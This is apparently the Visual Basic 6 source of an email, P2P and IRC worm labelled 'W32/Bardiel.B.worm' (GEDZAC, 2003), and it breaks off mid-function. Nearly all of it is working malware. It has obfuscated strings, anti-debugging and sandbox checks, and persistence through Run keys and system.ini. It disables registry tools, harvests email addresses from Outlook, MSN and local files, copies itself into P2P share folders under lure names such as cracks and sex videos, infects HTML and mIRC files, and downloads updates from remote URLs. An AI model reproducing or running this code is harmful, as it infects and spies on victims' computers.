   VERSION 5.00
   Begin VB.Form Bform
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Bardiel"
      ClientHeight    =   30
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   780
      Icon            =   "Bardiel.frx":0000
      LinkTopic       =   "Bardiel"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   30
      ScaleWidth      =   780
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.Timer Bt2
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   2520
         Top             =   0
      End
      Begin VB.Timer Bt1
         Enabled         =   0   'False
         Interval        =   11000
         Left            =   1320
         Top             =   0
      End
   End
   Attribute VB_Name = "Bform"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Declare Function SetPriorityClass Lib "kernel32" (ByVal hProcess As Long, ByVal dwPriorityClass As Long) As Long
   Private Const HIGH_PRIORITY_CLASS = &H80
   Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
   Private Declare Function CreateMutex Lib "kernel32" Alias "CreateMutexA" (ByRef lpMutexAttributes As SECURITY_ATTRIBUTES, ByVal bInitialOwner As Long, ByVal lpName As String) As Long
   Private Type SECURITY_ATTRIBUTES
   nLength As Long: lpSecurityDescriptor As Long: bInheritHandle As Long
   End Type
   Private Const ERROR_ALREADY_EXISTS = 183&: Dim Mutex
   Private Declare Function GetCommandLine Lib "kernel32" Alias "GetCommandLineA" () As String
   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
   Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
   Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
   Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
   Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
   Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
   Const RSP_SIMPLE_SERVICE = 1
   Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
   Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
   Const REG_SZ = 1: Const HKEY_CURRENT_USER As Long = &H80000001
   Const KEY_QUERY_VALUE = &H1
   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long
   Dim Bf As Object, Bw As Object, Bd As Object: Dim Bm1(0 To 4) As String: Dim Cml As Object: Dim BScript1 As String, BScript2 As String, BC4 As String
   Dim key1 As String, key2 As String, key3 As String, BCopy As Integer

   Private Sub Form_Load()
   '<*************GEDZAC LABS 2003*************>
   'W32/Bardiel.B.worm By MachineDramon/GEDZAC
   'Hecho en Sudamerica(Perú) - 01/11/2003
   'Derechos Reservados
   '<*******************************************>

   On Error Resume Next
   If GetWinVersion() <> 2 Then HideProcess
   Set Bf = CreateObject(q("Tdunwsni`)AnkbT~tsbjHembds")): Set Bw = CreateObject(q("PTdunws)Tobkk"))
   Call MircDCC: If IsBKey Then Call Bardiel Else Call BSetup
   End Sub

   Sub MircDCC()
   On Error Resume Next: Dim v As String: v = ""

   sRg = Array(q("OLB^XKHDFKXJFDONIB[Thaspfub[IrJb`f[ThasNDB[NitsfkkCnu"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Rinitsfkk[ThasNDB[RinitsfkkTsuni`"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Fww'Wfsot[Khfcbu45)B b[Wfso"))

   For x = 0 To UBound(sRg)
   sRr = Rr(sRg(x))
   If sRr <> v Then End
   Next

   sHn = Array(q("[[[[)[[TNDB"), q("[[[[)[[TNPQNC"), q("[[[[)[[ISNDB"))

   For i = 0 To UBound(sHn)
   sHle = CreateFile(sHn(i), &H40000000, &H1 Or &H2, ByVal 0&, 3, 0, 0)
   If sHle <> ((Asc("%") - 1) / -2) + ((8 * 2) + (6 Xor 7)) Then End
   Next

   If IsDebuggerPresent() <> (20 / -5) + (3 Xor 7) Then End

   For Each strEnv In Bw.Environment(q("WUHDBTT"))
          If InStr(LCase(strEnv), q("djcknib")) And InStr(LCase(strEnv), q("pnindb")) Then End
   Next

   If Asc(Left(GetCommandLine, 1)) <> (-(10 Or 2) * -4) - ((5 Xor 7) * 3 * (3 And 9)) Then End
   End Sub

   Sub BSetup()
   Call MircDCC
   On Error Resume Next: Dim br1234 As String: br1234 = Rm
   FileCopy Sp(3), Sp(0) & q("[") & br1234: key1 = Rm: key2 = Rm: key3 = Rm
   FileCopy Sp(0) & q("[") & br1234, Sp(1) & q("[") & key1: SA Sp(1) & q("[") & key1, 6
   FileCopy Sp(0) & q("[") & br1234, Sp(1) & q("[") & key2
   FileCopy Sp(0) & q("[") & br1234, Sp(1) & q("[") & key3

   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[PnichptIS[DruubisQbutnhi[Uri[JnduhKhfc"), Sp(1) & q("[") & key1, ""
   Rw q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[PnichptIS[DruubisQbutnhi[Whkndnbt[T~tsbj[CntfekbUb`ntsu~Shhkt"), 1, "BWORD"
   Rw q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Whkndnbt[T~tsbj[CntfekbUb`ntsu~Shhkt"), 1, "PWORD"
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Uri[JnduhKhfc"), Sp(1) & q("[") & key1, ""

   For Each k In EnDisck(2)
   If Flx(k & q("frshb bd)efs")) Then
   Set B_a = Bf.OpenTextFile(k & q("frshb bd)efs"), 8)
   B_a.write vbCrLf & q("Gpni'") & Right(Sp(1), Len(Sp(1)) - 2) & q("[") & key1: B_a.Close
   End If
   Next

   WIni q("ehhs"), q("tobkk"), q("B wkhubu)b b'") & Sp(1) & q("[") & key2, Sp(0) & q("[T~tsbj)nin")
   WIni q("Pnichpt"), q("uri"), Sp(1) & q("[") & key3, Sp(0) & q("[pni)nin")
   Rw q("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Pnichpt'Tdunwsni`'Ohts[Tbssni`t[Snjbhrs"), 0, "BORD"

   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Wfubis"), Sp(3), ""
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ECf~"), Day(Date), ""
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~6"), q(key1), ""
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~5"), q(key2), ""
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~4"), q(key3), ""
   Bw.run Sp(1) & q("[") & key1: Bw.run Sp(1) & q("[") & key2: Bf.DeleteFile Sp(0) & q("[") & br1234
   If InStr(LCase(LanguageID()), q("btwföhk")) <> 0 Then
   MsgBox q("Bk'fudonqh'btsf'shsfk'h'wfudnfkjbisb'cföfch+'njwhtnekb'feunu'bk'fudonqh"), vbCritical, q("Buuhu")
   Else
   MsgBox q("Sob'ankb'sont'shsfk'hu'wfusnfkk~'cfjf`bc+'njwhttnekb'sh'hwbi'sob'ankb"), vbCritical, q("Buuhu")
   End If
   End
   End Sub

   Sub Bardiel()
   Call MircDCC
   On Error Resume Next
   Call Regenerar
   If App.PrevInstance Then
   End
   End If
   If InStr(LCase(Sp(3)), LCase(key1)) <> 0 Then
   Call CreateBMutex: Bw.run Sp(1) & q("[") & key2 'Call Priority
   BCopy = 1: SetVar (1): Call BMailsL: Call BMailsM: Call BMailsH: Call BSendMail: Call UnSetVar: Bt1.Enabled = True: Bw.run Sp(0) & q("[dfw)b b")
   ElseIf InStr(LCase(Sp(3)), LCase(key2)) <> 0 Then
   BCopy = 2: SetVar (2): Bt1.Enabled = True: Bt2.Enabled = True
   Call payload1: Call payload2: Call payload3: Call payload4: Call payload5
   ElseIf InStr(LCase(Sp(3)), LCase(key3)) <> 0 Then
   BCopy = 3: Call BComponents: Call Actualizer: Call BP2P: Call Bred: Bt1.Enabled = True
   Else
   End
   End If
   End Sub

   Function IsBKey()
   On Error Resume Next
   key1 = q(Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~6")))
   key2 = q(Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~5")))
   key3 = q(Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~4")))
   IsBKey = IIf(Flx(Sp(1) & q("[") & key1), True, False)
   End Function

   Sub Regenerar()
   On Error Resume Next: Dim RegPath As String, RegName As String: Bfiles = Array(key1, key2, key3): RegPath = Sp(1) & q("[")
   For i = 0 To UBound(Bfiles)
   If Not (Flx(RegPath & Bfiles(i))) Then
   RegName = Rm(): Bf.Copyfile Sp(3), RegPath & RegName: SA RegPath & RegName, 0
   Bf.Copyfile RegPath & RegName, RegPath & Bfiles(i): Bf.DeleteFile RegPath & RegName
   End If
   Next
   End Sub

   Sub SetVar(x)
   On Error Resume Next
   Select Case x
   Case 2
   If Not (Flx(Sp(0) & q("[PNININS)nin"))) Then Set w = Bf.createtextfile(Sp(0) & q("[PNININS)nin")): w.write q("\UbifjbZ"): w.Close
   Bm1(0) = q("[Efucnbk)tdu"): Bm1(1) = q("[0Cêft)tdu"): Bm1(2) = q("[B~bt/Hmht.)tdu"): Bm1(3) = q("[QfjwnubTkf~bu)tdu"): Bm1(4) = q("[Ficubf)tdu")
   Case 1
   Set T1 = Bf.createtextfile(Sp(2) & q("[JfnkK)cfs")): T1.write q("P45(Efucnbk"): T1.Close
   Set T2 = Bf.createtextfile(Sp(2) & q("[JfnkO)cfs")): T2.write q("P45(Efucnbk"): T2.Close
   Set T3 = Bf.createtextfile(Sp(2) & q("[JfnkJ)cfs")): T3.write q("P45(Efucnbk"): T3.Close
   Set Cml = CreateObject(q("Tdunwsni`)Cndsnhifu~")): Set Bd = CreateObject(q("Tdunwsni`)Cndsnhifu~"))
   Bd.Add q("osjk"), 1: Bd.Add q("osj"), 2
   Bd.Add q("wow"), 4: Bd.Add q("ftw"), 5: Bd.Add q("tosjk"), 6: Bd.Add q("tosj"), 7: Bd.Add q("wosjk"), 8
   Bd.Add q("wk`"), 11: Bd.Add q("os "), 12: Bd.Add q("jos"), 13: Bd.Add q("josjk"), 14: Bd.Add q("mtw"), 15
   BC4 = B64(Sp(1) & q("[") & key3)
   Bw.run Sp(1) & q("[") & key3
   BScript1 = q("JNJB*Qbutnhi='6)7") & vbCrLf & q("Dhisbis*Khdfsnhi=ankb=(((Efucnbk)b b") & vbCrLf & q("Dhisbis*Sufitabu*Bidhcni`='eftb13") & vbCrLf & _
   BC4 & vbCrLf & q(";Tdunws'Kfi`rf`b':' QETdunws 9") & vbCrLf
   BScript2 = vbCrLf & q("nc':'tbsSnjbhrs/%JN/.%+'627.") & vbCrLf & q("Tre'JN/.") & vbCrLf & _
   q("Qws':'KDftb/Chdrjbis)ruk.") & vbCrLf & q("Qs :%;hembds'ts~kb:#druthu=duhtt*ofnu#'dkfttnc:#dktnc=55555555*5555*5555*5555#''DHCBEFTB:#josjk=%!Qws!%&ankb=(((Efucnbk)b b#9;(hembds9%") & vbCrLf & _
   q("Qs ':'Ubwkfdb/Qs +'%#%+'Dou/43..='Chdrjbis)Punsb'/Qs .'!'qeDuKa'!'Efucnbk") & vbCrLf & _
   q("Bic'Tre") & vbCrLf & q("Aridsnhi'B/dhcb.") & vbCrLf & q("Ahu'n':'6'Sh'Kbi/dhcb.") & vbCrLf & _
   q("Dl':'Ftd/Jnc/dhcb+'n+'6..") & vbCrLf & q("Na'Dl':'Ftd/%¢%.'Sobi") & vbCrLf & _
   q("B':'B'!'") & Chr(34) & "%" & Chr(34) & vbCrLf & q("BktbNa'Dl':'5?'Sobi") & vbCrLf & _
   q("B':'B'!'Dou/64.") & vbCrLf & q("BktbNa'Dl':'5>'Sobi") & vbCrLf & _
   q("B':'B'!'Dou/67.") & vbCrLf & q("Bktb") & vbCrLf & _
   q("B':'B'!'Dou/Dl'_hu'0.") & vbCrLf & q("Bic'Na") & vbCrLf & _
   q("Ib s") & vbCrLf & q("Bic'Aridsnhi") & vbCrLf & q(";(Tdunws9")
   End Select
   End Sub

   Sub FdInfected()
   On Error Resume Next: Static Espejo As String, eb1 As String

   For Each Fd In Bf.Drives
   If (Fd.DriveType <> 1) Or (Fd.IsReady = False) Then Exit Sub
   If (Fd.freespace < 111000) Then Exit Sub

   Randomize: R = Int(Rnd * 5): df1 = LCase(Dir(Fd.Path & q("[-)-")))
   If Espejo <> "" Then eb1 = Espejo Else eb1 = q("eBt*@BC]FD")
   If (df1 <> "") And (Espejo <> df1) And (InStr(df1, ".scr") = 0) And (InStr(df1, eb1) = 0) Then
   Espejo = df1: FileCopy Sp(1) & q("[") & key2, Fd.Path & q("[") & df1 & q(")wna")
   Else
   If Flx(Fd.Path & Bm1(R)) Then Exit Sub
   FileCopy Sp(1) & q("[") & key2, Fd.Path & Bm1(R)
   End If
   Next
   End Sub

   Sub BP2P()
   On Error Resume Next
   p1 = Array(q("D=[Wuh`ufj'Ankbt"), "C:\Archivos de programa")

   p2 = Array("\appleJuice\incoming", "\eDonkey2000\incoming", "\Gnucleus\Downloads", _
   "\Grokster\My Grokster", "\ICQ\shared files", "\Kazaa\My Shared Folder", _
   "\KaZaA Lite\My Shared Folder", "\LimeWire\Shared", "\morpheus\My Shared Folder", _
   "\Overnet\incoming", "\Shareaza\Downloads", "\Swaptor\Download", "\WinMX\My Shared Folder", _
   "\Tesla\Files", "\XoloX\Downloads", "\Rapigator\Share", "\KMD\My Shared Folder", "\BearShare\Shared")

   For i = 0 To UBound(p1)

   If Bf.FolderExists(p1(i)) Then

   For x = 0 To UBound(p2)

   If Bf.FolderExists(p1(i) & p2(x)) Then InfectP2P (p1(i) & p2(x))

   Next

   End If
   Next

   If Bf.FolderExists("C:\My Downloads") Then InfectP2P ("C:\My Downloads")

   IsD = Rr(q("OLB^XDRUUBISXRTBU[Thaspfub[ThrkTbbl[NitsfkkWfso"))
   If IsD <> "" Then VSoulSeek IsD

   End Sub

   Sub VSoulSeek(Xd)
   On Error Resume Next
   Set k1 = Bf.OpenTextFile(Xd & q("[tofubc)da`"))
   Do While k1.AtendOfstream = False
   k2 = k1.ReadAll
   Loop: k1.Close
   k2 = Mid(k2, 9, Len(k2) - 14): k2 = Mid(k2, InStr(k2, ":") - 1): InfectP2P k2 & q("[")
   End Sub

   Sub InfectP2P(Xd)
   On Error Resume Next
   If Len(Xd) >= 3 Then
   If Right(Xd, 1) <> q("[") Then Xd = Xd & q("[")
   For Each i In P2PName()
   If Dir(Xd & i) = "" Then FileCopy Sp(1) & q("[") & key2, Xd & i
   Next

   For Each w In LFiles(Xd)
   If Dir(Xd & w & q(")b b")) = "" Then
   If w <> "" Then FileCopy Sp(1) & q("[") & key2, Xd & w & q(")b b")
   End If
   Next

   End If
   End Sub

   Function LFiles(XDir)
   On Error Resume Next: Dim Xf, Xfs, x() As String
   Set Xf = Bf.GetFolder(XDir): ReDim x(1 To (Xf.Files.Count)): a = 1
   For Each k In Xf.Files
   Ex = LCase(Bf.GetExtensionName(k.Path))
   If (Ex <> "exe") Then x(a) = k.Name: a = a + 1
   Next: LFiles = x
   End Function

   Function P2PName(Optional VR)
   On Error Resume Next
   P = Array("Ana Kournikova Sex Video.exe", "AVP Antivirus Pro Key Crack.exe", "Britney Spears Sex Video.exe", "Buffy Vampire Slayer Movie.exe", _
   "Crack Passwords Mail.exe", "Cristina Aguilera Sex Video.exe", "Game Cube Real Emulator.exe", "Hentai Anime Girls Movie.exe", "Jenifer Lopez Sex Video.exe", _
   "Matrix Movie.exe", "Mcafee Antivirus Scan Crack.exe", "Norton Anvirus Key Crack.exe", "Panda Antivirus Titanium Crack.exe", "PS2 PlayStation Simulator.exe", _
   "Quick Time Key Crack.exe", "Sakura Card Captor Movie.exe", "Sex Live Simulator.exe", "Sex Passwords.exe", "Spiderman Movie.exe", "Start Wars Trilogy Movies.exe", _
   "Thalia Sex Video.exe", "Winzip KeyGenerator Crack.exe ", "aol cracker.exe", "aol password cracker.exe", "divx pro.exe", "GTA 3 Crack.exe", "GTA 3 Serial.exe", _
   "play station emulator.exe", "virtua girl - adriana.exe", "virtua girl - bailey short skirt.exe", "Virtua Girl (Full).exe", "warcraft 3 crack.exe", "warcraft 3 serials.exe", _
   "counter-strike.exe", "delphi.exe", "divx_pro.exe", "HotGirls.exe", "hotmail_hack.exe", "pamela_anderson.exe", "serials2000.exe", "subseven.exe", "VB6.exe", "VirtualSex.exe", _
   "ACDSee 5.5.exe", "Age of Empires 2 crack.exe", "Animated Screen 7.0b.exe", "AOL Instant Messenger.exe", "AquaNox2 Crack.exe", "Audiograbber 2.05.exe", "BabeFest 2003 ScreenSaver 1.5.exe", _
   "Babylon 3.50b reg_crack.exe", "Battlefield1942_bloodpatch.exe", "Battlefield1942_keygen.exe", "Business Card Designer Plus 7.9.exe", "Clone CD 5.0.0.3 (crack).exe", "Clone CD 5.0.0.3.exe", _
   "Coffee Cup Free exe 7.0b.exe", "Cool Edit Pro v2.55.exe", "Diablo 2 Crack.exe", "DirectDVD 5.0.exe", "DirectX Buster (all versions).exe", "DirectX InfoTool.exe", "DivX Video Bundle 6.5.exe", _
   "Download Accelerator Plus 6.1.exe", "DVD Copy Plus v5.0.exe", "DVD Region-Free 2.3.exe", "FIFA2003 crack.exe", "Final Fantasy VII XP Patch 1.5.exe", "Flash MX crack (trial).exe", "FlashGet 1.5.exe", _
   "FreeRAM XP Pro 1.9.exe", "GetRight 5.0a.exe", "Global DiVX Player 3.0.exe", "Gothic2 licence.exe", "Guitar Chords Library 5.5.exe", "Hitman_2_no_cd_crack.exe", "Hot Babes XXX Screen Saver.exe", _
   "ICQ Pro 2003a.exe", "ICQ Pro 2003b (new beta).exe", "iMesh 3.6.exe", "iMesh 3.7b (beta).exe", "IrfanView 4.5.exe", "KaZaA Hack 2.5.0.exe", "KaZaA Speedup 3.6.exe", "Links 2003 Golf game (crack).exe", _
   "Living Waterfalls 1.3.exe", "Mafia_crack.exe", "Matrix Screensaver 1.5.exe", "MediaPlayer Update.exe", "mIRC 6.40.exe", "mp3Trim PRO 2.5.exe", "MSN Messenger 5.2.exe", "NBA2003_crack.exe", _
   "Need 4 Speed crack.exe", "Nero Burning ROM crack.exe", "Netfast 1.8.exe", "Network Cable e ADSL Speed 2.0.5.exe", "NHL 2003 crack.exe", "Nimo CodecPack (new) 8.0.exe", "PalTalk 5.01b.exe", _
   "Popup Defender 6.5.exe", "Pop-Up Stopper 3.5.exe", "QuickTime_Pro_Crack.exe", "Serials 2003 v.8.0 Full.exe", "SmartFTP 2.0.0.exe", "SmartRipper v2.7.exe", "Space Invaders 1978.exe", _
   "Splinter_Cell_Crack.exe", "Steinberg_WaveLab_5_crack.exe", "Trillian 0.85 (free).exe", "TweakAll 3.8.exe", "Unreal2_bloodpatch.exe", "Unreal2_crack.exe", "UT2003_bloodpatch.exe", _
   "UT2003_keygen.exe", "UT2003_no cd (crack).exe", "UT2003_patch.exe", "WarCraft_3_crack.exe", "Winamp 3.8.exe", "WindowBlinds 4.0.exe", "WinOnCD 4 PE_crack.exe", "WinZip 9.0b.exe", _
   "Yahoo Messenger 6.0.exe", "Zelda Classic 2.00.exe", "Windows XP complete + serial.exe", "Screen saver christina aguilera.exe", "Screen saver christina aguilera naked.exe", "Visual basic 6.exe", _
   "Starcraft serial.exe", "Credit Card Numbers generator(incl Visa,MasterCard,...).exe", "Edonkey2000-Speed me up scotty.exe", "Hotmail Hacker 2003-Xss Exploit.exe", "Kazaa SDK + Xbit speedUp for 2.xx.exe", _
   "Microsoft KeyGenerator-Allmost all microsoft stuff.exe", "Netbios Nuker 2003.exe", "Security-2003-Update.exe", "Stripping MP3 dancer+crack.exe", "Visual Basic 6.0 Msdn Plugin.exe", "Windows Xp Exploit.exe", _
   "WinRar 3.xx Password Cracker.exe", "WinZipped Visual C++ Tutorial.exe", "XNuker 2003 2.93b.exe", "cable modem ultility pack.exe", "macromedia dreamweaver key generator.exe", "winamp plugin pack.exe", _
   "winzip full version key generator.exe")
   If IsMissing(VR) Then P2PName = P Else Randomize: P2PName = P(Int(Rnd * UBound(P)))
   End Function

   Sub Actualizer()
   Call MircDCC
   On Error Resume Next
   Bday = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ECf~"))
   If BState = False Then Exit Sub
   If Dow() = True Then Exit Sub
   If (CInt(Bday) + Day(Date)) Mod 3 <> 0 Then Exit Sub
   Dim Ap(1 To 5) As String
   Ap(1) = q("ossw=((cej6)biq~)ir(erwcfsb)eni")
   Ap(2) = q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(erwcfsb)eni")
   Ap(3) = q("ossw=((jfdonibc)pbednicfunh)dhj(erwcfsb)eni")
   Ap(4) = q("ossw=((`ej6)biq~)ir(erwcfsb)eni")
   Ap(5) = q("ossw=((mej6)biq~)ir(erwcfsb)eni")
   Randomize: R = Int(Rnd * 5) + 1

   a = DowFile(Ap(R), Sp(0) & q("[E4)e"))
   If (a = True) Then
   If FileLen(Sp(0) & q("[E4)e")) < 90000 Then Exit Sub
   FileCopy Sp(0) & q("[E4)e"), Sp(2) & q("[Es6)e")
   FileCopy Sp(0) & q("[E4)e"), Sp(2) & q("[Es5)e")
   FileCopy Sp(0) & q("[E4)e"), Sp(2) & q("[Es4)e")
   Set B1 = Bf.createtextfile(Sp(0) & q("[Pninins)nin"))
   B1.WriteLine q("\UbifjbZ")
   B1.WriteLine MsD(Sp(1) & q("[") & key1) & q(":") & MsD(Sp(2) & q("[Es6)e"))
   B1.WriteLine MsD(Sp(1) & q("[") & key2) & q(":") & MsD(Sp(2) & q("[Es5)e"))
   B1.WriteLine MsD(Sp(1) & q("[") & key3) & q(":") & MsD(Sp(2) & q("[Es4)e"))
   B1.Close
   Kill Sp(0) & q("[E4)e")
   Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[FdsSnjb"), Day(Date), ""
   End If
   End Sub
   Sub BMailsM()
   On Error Resume Next
   Dim RetO As Long, RetV As Long, Kn As Long, Kv As String, Vb1 As Long
   For i = 1 To 102
   RetO = RegOpenKeyEx(HKEY_CURRENT_USER, CStr(q("Thaspfub[Jnduhthas[JTIJbttbi`bu[KntsDfdob[)IBS'Jbttbi`bu'Tbuqndb")), 0, KEY_QUERY_VALUE, Kn)
   If RetO <> 0 Then BMail Cml: Exit Sub
   RetV = RegQueryValueEx(Kn, CStr(q("fkkhp") & i), 0&, REG_SZ, 0&, Vb1)
   If RetV <= 2 Then BMail Cml: Exit Sub
   Kv = String(Vb1 + 1, " ")
   RetV = RegQueryValueEx(Kn, CStr(q("fkkhp") & i), 0&, REG_SZ, ByVal Kv, Vb1)
   Kv = Left(Kv, InStr(LCase(Kv), q(")dhj")) + 3)
   If IsMail(Kv) Then Cml.Add Cml.Count + 1, Kv
   RegCloseKey Kn: Kv = "": Vb1 = 0
   Next
   End Sub

   Sub BMailsL()
   On Error Resume Next: Dim Ox1 As Object, Mxq As Object, Mx As Object
   Set Ox1 = CreateObject(q("Hrskhhl)Fwwkndfsnhi")): Set Mxq = Ox1.GetNamespace(q("JFWN"))
   Set Mx = Mxq.GetDefaultFolder(10).Items
   For i = 1 To Mx.Count
   If IsMail(Mx.Item(i).Email1Address) Then Cml.Add Cml.Count + 1, Mx.Item(i).Email1Address
   Next
   BMail Cml: Set Ox1 = Nothing
   End Sub

   Sub BMailsH()
   Call WriteReg
   On Error Resume Next
   For Each B4 In EnDisck(2)
   Bl (B4)
   Next
   BMail Cml
   End Sub

   Sub Bl(B01)
   On Error Resume Next
   For Each B10 In Bf.GetFolder(B01).SubFolders
   BH (B10.Path): Bl (B10.Path)
   Next
   End Sub

   Sub BH(B47)
   On Error Resume Next
   Dim HI As Boolean, Bex As String, Ben As String, Xl As String
   For Each B11 In Bf.GetFolder(B47).Files
   Bex = LCase(Bf.GetExtensionName(B11.Path)): Ben = LCase(B11.Name)
   If (Bd.Exists(Bex)) Then 'Or (Bex = q("s s"))

   Set Xf = Bf.OpenTextFile(B11.Path)
   Do While Xf.AtendOfstream = False
   HI = False: Xl = Xf.ReadLine
   If InStr(LCase(Xl), q("efucnbk)b b")) <> 0 Then HI = True: Exit Do
   If InStr(LCase(Xl), q("dfwtncb)b b")) <> 0 Then HI = True: Exit Do
   n = InStr(LCase(Xl), q("jfnksh="))
   If n <> 0 Then
   Xl = Left(Right(Xl, (Len(Xl) - (n + 6))), InStr(Right(Xl, (Len(Xl) - (n + 6))), Chr(34)) - 1)
   If IsMail(Xl) Then Cml.Add Cml.Count + 1, Xl
   'ElseIf (InStr(LCase(Xl), q("jfnksh=")) = 0) And (InStr(Xl, "@") <> 0) Then
   'x0 = InStr(Xl, "@"): xl1 = Mid(Xl, 1, x0 - 1): xl1 = Mid(xl1, InStrRev(xl1, Chr(32)) + 1)
   'xl2 = Mid(Xl, x0 + 1): xl2 = Left(xl2, InStr(xl2, Chr(32)) - 1)
   'If IsMail(xl1 & "@" & xl2) Then Cml.Add Cml.Count + 1, xl1 & "@" & xl2
   End If
   Loop
   Xf.Close
   If (HI <> True) And ((InStr(Ben, "index") <> 0) Or (InStr(Ben, "main") <> 0)) Then BHtmlInfected (B11.Path)

   ElseIf (Ben = q("jnud45)b b")) Or (Ben = q("jnud)nin")) Then BMirc B47

   ElseIf (Ben = q("wnudo45)nin")) Or (Ben = q("wnudo>?)nin")) Or (Ben = q("wnudo>?)b b")) Or (Ben = q("wnudo45)b b")) Then BPirch B47

   End If
   Next
   End Sub

   Sub BMail(Cml)
   On Error Resume Next
   For i = 1 To Cml.Count
   If InStr(LCase(Cml.Item(i)), q("kfsnijfnk")) <> 0 Then
   Set L1 = Bf.OpenTextFile(Sp(2) & q("[JfnkK)cfs"), 8)
   L1.write vbCrLf & Cml.Item(i): L1.Close
   ElseIf InStr(LCase(Cml.Item(i)), q("ohsjfnk")) <> 0 Then
   Set H1 = Bf.OpenTextFile(Sp(2) & q("[JfnkO)cfs"), 8)
   H1.write vbCrLf & Cml.Item(i): H1.Close
   Else
   Set M1 = Bf.OpenTextFile(Sp(2) & q("[JfnkJ)cfs"), 8)
   M1.write vbCrLf & Cml.Item(i): M1.Close
   End If
   Next
   Cml.RemoveAll
   End Sub

   Sub UnSetVar()
   On Error Resume Next
   Set Cml = Nothing: Set Bd = Nothing: BScript1 = "": BScript2 = ""
   End Sub

   Function EnDisck(a)
   On Error Resume Next
   Dim Bm1c1() As String: Dim Bd As Integer, i As Integer
   Set Bd1 = Bf.Drives

   For Each Bd2 In Bd1
   If Bd2.DriveType = a Then Bd = Bd + 1
   Next

   ReDim Bm1c1(1 To Bd)

   For Each Bd3 In Bd1
   If Bd3.DriveType = a Then: i = i + 1: Bm1c1(i) = Bd3.Path & q("[")
   Next
   EnDisck = Bm1c1
   End Function

   Function Flx(P)
   On Error Resume Next: Flx = IIf(Bf.Fileexists(P), True, False)
   End Function


   Function FrFile()
   On Error Resume Next: FrFile = FreeFile
   End Function

   Sub HideProcess()
   On Error Resume Next: Dim H As Long
   H = RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE)
   End Sub

   Function Sp(x)
   On Error Resume Next
   Select Case x
   Case 0: Sp = Bf.GetSpecialFolder(0)
   Case 1: Sp = Bf.GetSpecialFolder(1)
   Case 2: Sp = Bf.GetSpecialFolder(2)
   Case 3: Sp = Mid(GetCommandLine(), 2, InStr(Mid(GetCommandLine(), 2), Chr(34)) - 1)
   End Select
   End Function

   Sub SA(P, a)
   On Error Resume Next: SetAttr P, a
   End Sub

   Function Rm()
   On Error Resume Next: Dim Bxt3(1 To 5) As String
   Bxt3(1) = q(")b b"): Bxt3(2) = q(")efs"): Bxt3(3) = q(")wna"): Bxt3(4) = q(")tdu"): Bxt3(5) = q(")dhj")
   Randomize: Br = Int(Rnd * 5) + 1
   For i = 1 To 7
